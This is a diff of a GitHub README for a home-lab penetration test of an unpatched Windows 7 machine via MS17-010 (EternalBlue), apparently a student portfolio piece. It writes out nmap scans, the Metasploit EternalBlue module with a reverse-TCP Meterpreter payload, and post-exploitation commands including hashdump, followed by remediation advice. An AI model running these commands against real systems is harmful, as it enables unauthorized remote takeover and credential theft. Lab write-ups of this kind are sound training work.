@@ -1,376 +1,149 @@
-# 🛡️ Windows 7 MS17-010 (EternalBlue) Vulnerability Assessment & Penetration Testing Lab
+# Windows 7 MS17-010 (EternalBlue) VAPT Lab
 
-<p align="center">
+![Status](https://img.shields.io/badge/status-completed-brightgreen)
+![Platform](https://img.shields.io/badge/platform-Kali%20Linux-blue)
+![CVE](https://img.shields.io/badge/CVE-2017--0144-red)
+![CVSS](https://img.shields.io/badge/CVSS-9.8%20Critical-critical)
 
-![Platform](https://img.shields.io/badge/Platform-Windows%207-blue)
-![OS](https://img.shields.io/badge/Attacker-Kali%20Linux-success)
-![Vulnerability](https://img.shields.io/badge/CVE-CVE--2017--0144-red)
-![Severity](https://img.shields.io/badge/Severity-Critical-red)
-![Framework](https://img.shields.io/badge/Framework-Metasploit-orange)
-![Status](https://img.shields.io/badge/Project-Completed-brightgreen)
-![License](https://img.shields.io/badge/License-Educational-lightgrey)
+Complete Vulnerability Assessment and Penetration Testing (VAPT) engagement against a vulnerable Windows 7 machine in a local, authorized home lab environment. This project demonstrates the full penetration testing lifecycle — reconnaissance, enumeration, vulnerability assessment, exploitation, and post-exploitation — against the MS17-010 (EternalBlue) SMB vulnerability.
 
-</p>
+> **Disclaimer:** This assessment was performed exclusively in an isolated, host-only virtual lab against a system I own and control. No unauthorized systems were accessed. This project is for educational and portfolio purposes only.
 
 ---
 
-# 📖 Project Overview
+## Lab Environment
 
-This project demonstrates a **complete Vulnerability Assessment and Penetration Testing (VAPT)** engagement performed against a vulnerable **Windows 7 SP1 x64** machine within an isolated and authorized virtual lab environment.
-
-The assessment follows a structured penetration testing methodology, including reconnaissance, enumeration, vulnerability validation, controlled exploitation, post-exploitation verification, and remediation planning.
-
-The primary objective was to identify and validate the **MS17-010 (EternalBlue)** vulnerability while documenting each phase of the engagement in a professional manner.
-
-> **⚠️ Disclaimer**
->
-> This project was conducted exclusively in an isolated lab environment for educational and defensive security purposes. No unauthorized systems were targeted.
+| Component | Details |
+|---|---|
+| Attacker Machine | Kali Linux (VirtualBox) |
+| Target Machine | Windows 7 (unpatched, vulnerable to MS17-010) |
+| Network | Host-Only Adapter (isolated) |
+| Tools Used | Nmap, Metasploit Framework, Meterpreter |
 
 ---
 
-# 🎯 Objectives
+## Vulnerability Summary
 
-✔ Discover the target host
-
-✔ Enumerate exposed services
-
-✔ Perform SMB enumeration
-
-✔ Identify security weaknesses
-
-✔ Validate MS17-010 vulnerability
-
-✔ Demonstrate exploitation in an authorized lab
-
-✔ Perform post-exploitation verification
-
-✔ Recommend security mitigations
-
----
-
-# 🖥️ Lab Architecture
-
-```
-                 VirtualBox Host-Only Network
-
-+---------------------------------------------------------+
-
-        Kali Linux                     Windows 7 SP1
-      (Attacker VM)                  (Target Machine)
-
-      192.168.100.3  ─────────────► 192.168.100.5
-
-+---------------------------------------------------------+
-```
-
----
-
-# 🧰 Tools & Technologies
-
-| Category | Tools |
-|------------|-------------------------|
-| Operating System | Kali Linux |
-| Target | Windows 7 SP1 x64 |
-| Network Scanner | Nmap |
-| SMB Enumeration | smbclient |
-| Enumeration | enum4linux |
-| Vulnerability Detection | Nmap NSE Scripts |
-| Exploitation | Metasploit Framework |
-| Post Exploitation | Meterpreter |
-
----
-
-# 🔄 VAPT Methodology
-
-```
-Reconnaissance
-        │
-        ▼
-Port Scanning
-        │
-        ▼
-Service Enumeration
-        │
-        ▼
-SMB Enumeration
-        │
-        ▼
-Vulnerability Assessment
-        │
-        ▼
-Vulnerability Validation
-        │
-        ▼
-Controlled Exploitation
-        │
-        ▼
-Post Exploitation
-        │
-        ▼
-Documentation & Remediation
-```
-
----
-
-# 🔍 Phase 1 — Reconnaissance
-
-The assessment began by identifying live hosts and exposed network services.
-
-### Activities
-
-- Host Discovery
-- Service Detection
-- Version Detection
-- Operating System Fingerprinting
-
-### Tools
-
-- Nmap
-
-### Screenshot
-
-```
-screenshots/01-nmap-service-scan.png
-```
-
----
-
-# 🌐 Phase 2 — Port & Service Enumeration
-
-Open ports were identified to determine the attack surface.
-
-| Port | Service | Description |
-|------|----------|-------------|
-|135|MSRPC|Microsoft Remote Procedure Call|
-|139|NetBIOS|NetBIOS Session Service|
-|445|SMB|Server Message Block|
-|49152-49157|RPC|Dynamic RPC Services|
-
----
-
-# 📂 Phase 3 — SMB Enumeration
-
-SMB enumeration was performed to identify accessible shares and gather system information.
-
-### Enumeration Tools
-
-- Nmap NSE
-- smbclient
-- enum4linux
-
-### Information Collected
-
-- Workgroup Name
-- NetBIOS Information
-- Computer Name
-- SMB Shares
-- SMB Version
-- Windows Build Information
-
-### Shares Identified
-
-- ADMIN$
-- C$
-- IPC$
-
-### Screenshots
-
-```
-Screenshots/02-smb-enum.png
-
-Screenshots/03-smbclient.png
-
-Screenshots/04-enum4linux.png
-```
-
----
-
-# 🚨 Phase 4 — Vulnerability Assessment
-
-Nmap NSE scripts were used to validate known SMB vulnerabilities.
-
-### Vulnerability Identified
-
-| Vulnerability | Value |
-|--------------|-------|
+| Field | Detail |
+|---|---|
+| Vulnerability | EternalBlue — SMBv1 Remote Code Execution |
 | CVE | CVE-2017-0144 |
-| Microsoft Bulletin | MS17-010 |
-| Common Name | EternalBlue |
-| Severity | Critical |
-| CVSS | 9.8 |
-
-### Screenshot
-
-```
-Screenshots/05-ms17-vulnerability.png
-```
+| CVSS v3.1 Score | 9.8 (Critical) |
+| Affected Protocol | SMBv1 (TCP 445) |
+| Metasploit Module | `exploit/windows/smb/ms17_010_eternalblue` |
 
 ---
 
-# 💥 Phase 5 — Vulnerability Validation
+## Methodology
 
-The vulnerability was validated using the Metasploit Framework within the authorized lab environment.
+### 1. Reconnaissance
+Identified the target IP on the host-only network and confirmed host availability.
 
-### Framework
-
-Metasploit
-
-### Module
-
-```
-exploit/windows/smb/ms17_010_eternalblue
+```bash
+arp-scan --localnet
+ping -c 4 <target-ip>
 ```
 
-### Activities
+![Host Discovery](Screenshots/01-host-discovery.png)
 
-- Module Selection
-- Target Verification
-- Payload Configuration
-- Session Establishment
+### 2. Enumeration
+Performed a full port and service scan to identify open services and versions.
 
-### Screenshots
-
+```bash
+nmap -sS -sV -A -T4 -p- <target-ip>
 ```
-Screenshots/06-metasploit-search.png
 
-Screenshots/07-module-options.png
+**Sample output:**
+PORT     STATE SERVICE      VERSION
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
 
-Screenshots/08-running-exploit.png
+![Nmap Service Scan](Screenshots/02-nmap-service-scan.png)
+
+### 3. Vulnerability Assessment
+Ran Nmap's SMB vulnerability scripts to confirm exposure to MS17-010.
+
+```bash
+nmap --script smb-vuln-ms17-010 -p445 <target-ip>
 ```
+
+**Sample output:**
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs: CVE:CVE-2017-0143
+|     Risk factor: HIGH
+
+![Vulnerability Scan](Screenshots/03-smb-vuln-scan.png)
+
+### 4. Exploitation
+Used Metasploit's EternalBlue module to gain remote code execution.
+
+```bash
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <target-ip>
+set LHOST <attacker-ip>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit
+```
+
+![Exploitation](Screenshots/04-eternalblue-exploit.png)
+
+### 5. Post-Exploitation
+Obtained a Meterpreter session with SYSTEM-level privileges and confirmed access.
+
+```bash
+meterpreter > getuid
+meterpreter > sysinfo
+meterpreter > hashdump
+```
+
+![Meterpreter Session](Screenshots/05-meterpreter-session.png)
 
 ---
 
-# 🖥️ Phase 6 — Post Exploitation
+## Impact
 
-After successful exploitation, post-exploitation activities were conducted to validate access and collect basic system information.
-
-### Information Gathered
-
-- Operating System
-- Computer Name
-- Architecture
-- Logged-in Users
-- File System Structure
-
-### Sample Output
-
-```
-Windows 7 SP1 x64
-
-Architecture : x64
-
-Computer Name : WIN-845Q99004PP
-
-Directory Listing : C:\
-```
-
-### Screenshot
-
-```
-Screenshots/09-meterpreter-session.png
-```
+Successful exploitation resulted in unauthenticated remote code execution with **NT AUTHORITY\SYSTEM** privileges — full administrative control of the target host, including the ability to read/write files, dump credential hashes, and pivot further into the network.
 
 ---
 
-# 📊 Assessment Summary
+## Remediation
 
-| Category | Status |
-|-----------|--------|
-| Host Discovery | ✅ |
-| Port Scanning | ✅ |
-| SMB Enumeration | ✅ |
-| Vulnerability Detection | ✅ |
-| MS17-010 Validation | ✅ |
-| Controlled Exploitation | ✅ |
-| Post Exploitation | ✅ |
-| Documentation | ✅ |
+- Apply Microsoft Security Bulletin **MS17-010** (patches KB4012212 / KB4012215 and related updates)
+- Disable SMBv1 entirely where not required (`Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`)
+- Restrict SMB (port 445) exposure at the network/firewall level
+- Implement network segmentation to limit lateral movement from compromised hosts
 
 ---
 
-# 🚩 Key Findings
+## Skills Demonstrated
 
-| Severity | Finding |
-|-----------|----------|
-| 🔴 Critical | MS17-010 (EternalBlue) |
-| 🟠 High | SMBv1 Enabled |
-| 🟡 Medium | SMB Information Disclosure |
-| 🟢 Low | Default Administrative Shares Exposed |
-
----
-
-# 🛡️ Remediation Recommendations
-
-- Apply Microsoft MS17-010 Security Updates
-- Disable SMBv1 Protocol
-- Restrict SMB Access Through Firewalls
-- Enable Network Segmentation
-- Implement Principle of Least Privilege
-- Deploy Endpoint Detection & Response (EDR)
-- Perform Regular Vulnerability Assessments
-- Monitor SMB Activity Using SIEM
+- Network reconnaissance and host discovery
+- Service enumeration with Nmap (NSE scripting)
+- Vulnerability identification and CVE/CVSS mapping
+- Exploit development workflow using Metasploit Framework
+- Post-exploitation and privilege verification with Meterpreter
+- Technical documentation and reporting
 
 ---
 
-# 🎓 Skills Demonstrated
-
-- Vulnerability Assessment
-- Penetration Testing
-- Windows Security
-- SMB Enumeration
-- Network Reconnaissance
-- Service Enumeration
-- Nmap
-- Metasploit Framework
-- Meterpreter
-- Post Exploitation
-- Technical Documentation
-- Security Reporting
-
----
-
-# 📁 Repository Structure
-
-```
+## Repository Structure
 Windows-7-MS17-010-VAPT-Lab/
-
 ├── README.md
-
-├── Screenshots/
-
-├── reports/
-
-│   ├── reconnaissance.md
-
-│   ├── enumeration.md
-
-│   ├── vulnerability-assessment.md
-
-│   ├── post-exploitation.md
-
-│   └── remediation.md
-
-└── LICENSE
-```
+└── Screenshots/
+├── 01-host-discovery.png
+├── 02-nmap-service-scan.png
+├── 03-smb-vuln-scan.png
+├── 04-eternalblue-exploit.png
+└── 05-meterpreter-session.png
 
 ---
 
-# 📌 Key Takeaways
+## Author
 
-- Successfully identified exposed SMB services.
-- Performed comprehensive SMB enumeration.
-- Validated the MS17-010 (EternalBlue) vulnerability.
-- Demonstrated controlled exploitation within an authorized lab.
-- Conducted post-exploitation validation.
-- Produced a professional security assessment with remediation recommendations.
-
----
-
-# 👨‍💻 Author
-
-**Hari Haran**
-
-**Cybersecurity | VAPT | Penetration Testing | SOC | Network Security | Linux | Windows Security**
-
----
-
-## ⭐ If you found this project useful, consider giving it a star!
+**Hariharan P**
+Aspiring Penetration Tester / SOC Analyst
